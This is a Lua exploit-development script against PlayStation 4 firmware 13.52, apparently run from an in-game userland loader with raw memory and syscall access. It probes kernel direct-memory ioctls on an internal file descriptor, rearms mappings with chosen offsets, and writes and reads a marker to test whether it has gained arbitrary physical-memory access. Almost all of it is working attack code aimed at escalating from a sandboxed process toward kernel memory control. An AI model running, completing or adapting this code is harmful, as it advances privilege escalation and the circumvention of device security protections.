-- PS4 FW 13.52 - R10 IOCTL SET RE-TESTED ON INTERNAL fd5 (PREPARED 2026-08-01, NOT RUN)
-- WHY: original R10 tested these ioctls on fd=S.open("/dev/dmem0")=22 (sandbox-wrapped,
--       every ioctl filtered -> -1 / crash). Later breakthrough proved the REAL dmem0 fd
--       is the libkernel-internal fd=5 (libk+0x58038+8). These struct-ioctls were NEVER
--       retried on fd5. This is the corrected replay.
-- WINDOW STATE: window was CLOSED this game-life by the all-zeros rearm in r9p. So this
--       script MUST run after a game restart, while the window is still open by default.
-- SAFETY: do NOT rearm before phase 1. If mmap returns -1 -> window closed, ABORT (no sweep).
--        Each descriptor ioctl is attempted one-at-a-time; if the loader dies on one,
--        that exact cmd is the culprit (log it, do not continue).
-- LUA 5.1: no &, no ~, no bitwise.

local mem = rawget(_G, "memory")
local S = rawget(_G, "syscall")

pcall(S.resolve, { ioctl = 54, mmap = 477 })

local function t(v)
  if v == nil then return -1 end
  if type(v) == "number" then return v end
  if type(v) == "table" and v.h ~= nil then return v.h * 4294967296 + v.l end
  return tonumber(tostring(v)) or -1
end
local function rb(a) return t(mem.read_byte(a)) end
local function rq(a) return t(mem.read_qword(a)) end

print("=== R10-FD5-READY START ===")
pcall(function()
  local buf = mem.alloc(0x100)
  local function zfill() mem.write_buffer(buf, string.rep(string.char(0x00), 0x100), 0x100) end
  local function hx(n) local s = "" for i = 0, math.min(n - 1, 31) do s = s .. string.format("%02x ", rb(buf + i)) end return s end

  -- PHASE 0: open-check the window WITHOUT rearming (default-open at game boot).
  local m = t(S.mmap(0, 0x100000, 3, 0x0001, 5, 0))
  print(string.format("[P0] mmap(fd5,1MB,off=0)=0x%x", m))
  if not (m > 0x100000 and m < 0xFFFFFFFFFF) then
    print("  WINDOW CLOSED - need game restart (do NOT sweep). ABORT.")
    return
  end
  print(string.format("[P0] self-ptr +0x18=0x%016x (dmap self; expect 0xffffffff2ec48000)", rq(m + 0x18)))

  -- PHASE 1: descriptor-block struct ioctls that R10 tried on fd22 - NOW on fd5.
  -- Layouts from libkernel RE (see R10/R11 headers).
  local tests = {
    {cmd=0x2000800b, name="open_init/no-buf", setup=function() end},
    {cmd=0x80020016, name="info16", setup=function() end},
    {cmd=0x480003f7, name="tune_f7", setup=function() end},
    {cmd=0xc018800d, name="mem_d {u64,u64,u32}", setup=function() zfill() mem.write_qword(buf,0x1000) mem.write_qword(buf+8,0x1000) mem.write_dword(buf+16,0) end},
    {cmd=0xc018800e, name="mem_e {u64,u64,u32 mode=0}", setup=function() zfill() mem.write_qword(buf,0x1000) mem.write_qword(buf+8,0x1000) mem.write_dword(buf+16,0) end},
    {cmd=0xc018800f, name="mem_f {u64,u64,u32,u32}", setup=function() zfill() mem.write_qword(buf,0x1000) mem.write_qword(buf+8,0x1000) end},
    {cmd=0xc0408013, name="map_13 {8x u64}", setup=function() zfill() end},
    {cmd=0xc0388014, name="alloc_14 {0x38}", setup=function() zfill() end},
    {cmd=0x80108017, name="map_17 {u64,u32,u32}", setup=function() zfill() mem.write_qword(buf,0x1000) end},
    {cmd=0xc0208016, name="map_16 {0x20}", setup=function() zfill() end},
  }
  for _, tc in ipairs(tests) do
    pcall(function()
      zfill()
      tc.setup()
      local r = t(S.ioctl(5, tc.cmd, buf))
      print(string.format("[P1] fd5 ioctl 0x%08x %s ret=%d buf=%s", tc.cmd, tc.name, r, hx(0x40)))
    end)
  end

  -- PHASE 2: release_direct_memory rearm with KNOWN-SAFE values only (never zeros).
  -- Confirmed-safe: base in {0x100000,0x10000000,0x40000000,0x80000000,0x2ec48000}, size=0x100000.
  print("[P2] rearm fd5 {base=0x100000, size=0x100000}")
  zfill()
  mem.write_qword(buf, 0x100000)
  mem.write_qword(buf + 8, 0x100000)
  local r = t(S.ioctl(5, 0x80108002, buf))
  print(string.format("  ioctl ret=%d", r))

  -- PHASE 3: marker test (r9z logic) - settle window-fixed vs arbitrary-phys in one pass.
  local function map(base)
    local mm = t(S.mmap(base, 0x100000, 3, 0x0001, 5, 0))
    print(string.format("  mmap(off=0x%x)=0x%x +0x18=0x%016x", base, mm, rq(mm + 0x18)))
    return mm
  end
  local function rearm(base)
    zfill()
    mem.write_qword(buf, base)
    mem.write_qword(buf + 8, 0x100000)
    return t(S.ioctl(5, 0x80108002, buf))
  end

  local m1 = map(0x2ec48000)
  mem.write_qword(m1 + 0x1000, 0xAABBCCDD)
  print(string.format("  wrote marker @+0x1000 readback=0x%08x", rq(m1 + 0x1000)))
  rearm(0x40000000)
  local m2 = map(0x40000000)
  print(string.format("  m2+0x1000=0x%016x (marker absent => distinct phys => ARBITRARY)", rq(m2 + 0x1000)))
  rearm(0x2ec48000)
  local m3 = map(0x2ec48000)
  local fixed = rq(m3 + 0x1000) == 0xAABBCCDD and rq(m2 + 0x18) == 0xffffffff2ec48000
  print(string.format("=== VERDICT: %s ===", fixed and "WINDOW FIXED (case a)" or "FOLLOWS OFFSET -> ARBITRARY PHYS (case b)!"))
end)
print("=== R10-FD5-READY DONE ===")
